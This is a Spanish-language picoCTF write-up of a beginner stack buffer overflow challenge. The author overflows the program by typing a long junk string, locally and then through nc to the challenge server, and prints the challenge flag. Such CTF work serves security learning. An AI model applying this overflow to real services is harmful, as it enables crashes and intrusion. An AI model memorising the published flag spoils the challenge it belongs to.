## Objetivo

Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/174/vuln). You can view source [here](https://artifacts.picoctf.net/c/174/vuln.c).

Additional details will be available after launching your challenge instance.

## Solución  

descargamos los archivos que nos viene en el reto

```java
┌──(kali㉿kali)-[~/Downloads/buffer]
└─$ ls    
program-redacted.c  vuln  vuln.c
                                               
┌──(kali㉿kali)-[~/Downloads/buffer]
└─$ chmod +x vuln 
                                               
┌──(kali㉿kali)-[~/Downloads/buffer]
└─$ file vuln 
vuln: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=b53f59f147e1b0b087a736016a44d1db6dee530c, for GNU/Linux 3.2.0, not stripped
                                               
┌──(kali㉿kali)-[~/Downloads/buffer]
└─$ ./vuln 
Please create 'flag.txt' in this directory with your own debugging flag.
                                               
┌──(kali㉿kali)-[~/Downloads/buffer]
└─$ echo 'flag {dummieflag}' > flag.txt
                                               
┌──(kali㉿kali)-[~/Downloads/buffer]
└─$ ./vuln 
Input: fghjkl
The program will exit now
                                               
┌──(kali㉿kali)-[~/Downloads/buffer]
└─$ man gets          
                                               
┌──(kali㉿kali)-[~/Downloads/buffer]
└─$ man strcpy
                                               
┌──(kali㉿kali)-[~/Downloads/buffer]
└─$ ./vuln 
Input: sdfgthyjuikhgdfghjdfghjcfvgbhnrftghjkddddddddddddddddddddddddddddddddddddddddddddddddjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj flag{dummieflag}
flag {dummieflag}

                                               
┌──(kali㉿kali)-[~/Downloads/buffer]
└─$ nc saturn.picoctf.net 53603
Input: sdfgthyjuikhgdfghjdfghjcfvgbhnrftghjkddddddddddddddddddddddddddddddddddddddddddddddddjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjsdfgthyjuikhgdfghjdfghjcfvgbhnrftghjkddddddddddddddddddddddddddddddddddddddddddddddddjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjsdfgthyjuikhgdfghjdfghjcfvgbhnrftghjkddddddddddddddddddddddddddddddddddddddddddddddddjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}

```

**picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}**
## Notas Adicionales 

### Referencias